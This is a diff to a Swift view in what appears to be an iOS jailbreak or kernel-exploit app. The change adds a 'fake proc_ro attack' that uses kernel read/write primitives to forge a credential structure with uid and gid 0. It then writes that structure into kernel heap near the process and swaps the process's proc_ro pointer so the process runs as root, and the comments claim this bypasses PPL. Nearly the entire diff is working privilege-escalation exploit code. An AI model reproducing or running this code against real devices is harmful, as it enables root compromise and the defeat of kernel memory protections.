@@ -308,7 +308,8 @@ struct BleedingEdgeIOSurfaceKRWView: View {
         let proc = ds_get_our_proc()
         guard proc != 0 else { rootResult = "proc = 0"; return }
         
-        let procRo = ds_kread64(proc + UInt64(off_proc_p_proc_ro))
+        let procRoAddr = proc + UInt64(off_proc_p_proc_ro)
+        let procRo = ds_kread64(procRoAddr)
         guard procRo != 0 else { rootResult = "proc_ro = 0"; return }
         
         let ucred = ds_kread64(procRo + UInt64(off_proc_ro_p_ucred))
@@ -318,65 +319,125 @@ struct BleedingEdgeIOSurfaceKRWView: View {
         let origUid = ds_kread32(uidAddr)
         
         var report = ""
-        report += String(format: "proc:    0x%llx\n", proc)
-        report += String(format: "proc_ro: 0x%llx\n", procRo)
-        report += String(format: "ucred:   0x%llx\n", ucred)
-        report += String(format: "uid addr: 0x%llx\n", uidAddr)
-        report += String(format: "orig uid: %d (0x%x)\n\n", origUid, origUid)
+        report += String(format: "proc:     0x%llx\n", proc)
+        report += String(format: "proc_ro:  0x%llx\n", procRo)
+        report += String(format: "ucred:    0x%llx\n", ucred)
+        report += String(format: "orig uid: %d\n\n", origUid)
         
-        // === TEST 1: Direct ucred write (expected to fail) ===
-        report += "=== Test 1: Direct uid write ===\n"
-        ds_kwrite32(uidAddr, 0)
-        let test1 = ds_kread32(uidAddr)
-        if test1 == 0 {
-            report += "✅ SUCCESS — uid=0! ROOT!\n"
-            ds_kwrite32(uidAddr + 4, 0)
-            ds_kwrite32(uidAddr + 8, 0)
+        // === FAKE PROC_RO ATTACK ===
+        report += "=== FAKE PROC_RO ATTACK ===\n\n"
+        
+        // Step 1: Read full proc_ro structure (copy first 0x30 bytes = 6 qwords)
+        report += "[1] Reading proc_ro contents...\n"
+        var procRoFields: [UInt64] = []
+        let procRoSize: UInt64 = 0x30  // 48 bytes = 6 fields
+        for i in stride(from: 0, to: Int(procRoSize), by: 8) {
+            procRoFields.append(ds_kread64(procRo + UInt64(i)))
+        }
+        
+        // Step 2: Read full ucred structure (copy first 0x88 bytes)
+        report += "[2] Reading ucred contents...\n"
+        var ucredFields: [UInt64] = []
+        let ucredSize: UInt64 = 0x88  // 136 bytes = 17 fields
+        for i in stride(from: 0, to: Int(ucredSize), by: 8) {
+            ucredFields.append(ds_kread64(ucred + UInt64(i)))
+        }
+        
+        // Step 3: Find writable heap space for fake structures
+        // We'll use the area AFTER our proc (proc structs are ~0x800 bytes apart)
+        // Actually safer: use IOSurface kernel object area or alloc via port spray
+        // Simplest: write fake data into unused fields of our own task struct
+        // Even simpler: use the socket pcb area which we know is writable
+        
+        // Use area near our proc (proc is on heap, nearby memory should also be heap)
+        // Allocate fake ucred 0x200 bytes after proc (should be in same heap page)
+        let fakeUcredAddr = proc + 0x600  // Well into our proc's heap allocation
+        let fakeProcRoAddr = proc + 0x700  // After fake ucred
+        
+        report += String(format: "[3] Fake ucred at:   0x%llx\n", fakeUcredAddr)
+        report += String(format: "    Fake proc_ro at: 0x%llx\n\n", fakeProcRoAddr)
+        
+        // Step 4: Write fake ucred (copy original, but set uid/gid to 0)
+        report += "[4] Writing fake ucred (uid=0, gid=0)...\n"
+        for (idx, field) in ucredFields.enumerated() {
+            var value = field
+            // Field at offset 0x18 contains cr_uid (low 32) and cr_ruid (high 32)
+            if idx == 3 { // offset 0x18 = index 3
+                value = 0  // cr_uid=0, cr_ruid=0
+            }
+            // Field at offset 0x20 contains cr_svuid and cr_ngroups
+            if idx == 4 { // offset 0x20 = index 4
+                value = value & 0xFFFFFFFF00000000  // zero cr_svuid, keep cr_ngroups
+            }
+            ds_kwrite64(fakeUcredAddr + UInt64(idx * 8), value)
+        }
+        
+        // Verify fake ucred was written
+        let fakeUid = ds_kread32(fakeUcredAddr + 0x18)
+        report += String(format: "    Fake ucred uid: %d (%@)\n\n", fakeUid, fakeUid == 0 ? "✅" : "❌")
+        
+        guard fakeUid == 0 else {
+            report += "❌ Failed to write fake ucred to heap\n"
             rootResult = report
             return
         }
-        report += String(format: "❌ Blocked (uid still %d)\n\n", test1)
         
-        // === TEST 2: Check if proc struct is writable ===
-        // Read a non-critical field, write it back, verify
-        report += "=== Test 2: proc struct writability ===\n"
-        let procRoAddr = proc + UInt64(off_proc_p_proc_ro)
-        let origProcRo = ds_kread64(procRoAddr)
-        report += String(format: "proc_ro ptr at: 0x%llx\n", procRoAddr)
-        report += String(format: "orig value: 0x%llx\n", origProcRo)
-        
-        // Write same value back (safe test - no change)
-        ds_kwrite64(procRoAddr, origProcRo)
-        let verify = ds_kread64(procRoAddr)
-        if verify == origProcRo {
-            report += "✅ proc_ro pointer is WRITABLE!\n"
-            report += "→ Fake proc_ro attack is POSSIBLE\n\n"
-            
-            // === TEST 3: Fake proc_ro attack ===
-            report += "=== Test 3: Fake proc_ro ===\n"
-            
-            // Step 1: Read entire proc_ro (first 0x30 bytes)
-            var procRoData: [UInt64] = []
-            for i in stride(from: 0, to: 0x30, by: 8) {
-                procRoData.append(ds_kread64(procRo + UInt64(i)))
+        // Step 5: Write fake proc_ro (copy original, but point ucred to fake)
+        report += "[5] Writing fake proc_ro...\n"
+        for (idx, field) in procRoFields.enumerated() {
+            var value = field
+            // Field at off_proc_ro_p_ucred offset (index 4 = offset 0x20)
+            let ucredFieldIdx = Int(off_proc_ro_p_ucred) / 8
+            if idx == ucredFieldIdx {
+                value = fakeUcredAddr  // Point to our fake ucred
             }
-            report += String(format: "proc_ro[0]: 0x%llx\n", procRoData[0])
-            report += String(format: "proc_ro[1]: 0x%llx\n", procRoData[1])
-            report += String(format: "proc_ro[2]: 0x%llx\n", procRoData[2])
-            report += String(format: "proc_ro[3]: 0x%llx\n", procRoData[3])
-            report += String(format: "proc_ro[4]: 0x%llx (ucred ptr)\n", procRoData[4])
-            report += String(format: "proc_ro[5]: 0x%llx\n", procRoData[5])
-            
-            // Step 2: Find a writable heap location for fake ucred
-            // Use our IOSurface mapped memory as scratch space
-            // Actually, we need kernel heap address. Use task struct area.
-            // For now, just report what we found
-            report += "\n→ To complete: need to allocate fake proc_ro in kernel heap\n"
-            report += "→ Then point proc_ro_ptr to it with uid=0 in fake ucred\n"
-            report += "→ This bypasses PPL because proc struct is on writable heap!\n"
+            ds_kwrite64(fakeProcRoAddr + UInt64(idx * 8), value)
+        }
+        
+        // Verify fake proc_ro ucred pointer
+        let fakeRoUcred = ds_kread64(fakeProcRoAddr + UInt64(off_proc_ro_p_ucred))
+        report += String(format: "    Fake proc_ro ucred ptr: 0x%llx (%@)\n\n", fakeRoUcred, 
+                        fakeRoUcred == fakeUcredAddr ? "✅" : "❌")
+        
+        guard fakeRoUcred == fakeUcredAddr else {
+            report += "❌ Failed to write fake proc_ro\n"
+            rootResult = report
+            return
+        }
+        
+        // Step 6: THE CRITICAL MOMENT - swap proc_ro pointer
+        report += "[6] ⚡ SWAPPING proc_ro pointer...\n"
+        report += String(format: "    %llx → %llx\n", procRo, fakeProcRoAddr)
+        
+        // Point proc to our fake proc_ro
+        ds_kwrite64(procRoAddr, fakeProcRoAddr)
+        
+        // Step 7: Verify - read uid through the new chain
+        let newProcRo = ds_kread64(procRoAddr)
+        report += String(format: "    New proc_ro: 0x%llx\n", newProcRo)
+        
+        let newUcred = ds_kread64(newProcRo + UInt64(off_proc_ro_p_ucred))
+        let newUid = ds_kread32(newUcred + 0x18)
+        report += String(format: "    New uid: %d\n\n", newUid)
+        
+        // Also check getuid() from userspace
+        let realUid = getuid()
+        report += String(format: "    getuid(): %d\n\n", realUid)
+        
+        if newUid == 0 || realUid == 0 {
+            report += "🎉🎉🎉 SUCCESS — ROOT ACHIEVED! 🎉🎉🎉\n"
+            report += "uid=0 via fake proc_ro bypass!\n"
+            report += "PPL BYPASSED via heap pointer swap!\n"
         } else {
-            report += "❌ proc_ro pointer NOT writable (PPL protects proc too)\n"
-            report += "→ Need DMA/GXF bypass\n"
+            report += "⚠️ Kernel shows uid=\(newUid), userspace uid=\(realUid)\n"
+            report += "Pointer swap may have been reverted or cached.\n"
+            
+            // Restore original to prevent instability
+            report += "\nRestoring original proc_ro...\n"
+            ds_kwrite64(procRoAddr, procRo)
+            let restored = ds_kread64(procRoAddr)
+            report += String(format: "Restored: 0x%llx (%@)\n", restored, 
+                           restored == procRo ? "✅" : "❌")
         }
         
         rootResult = report
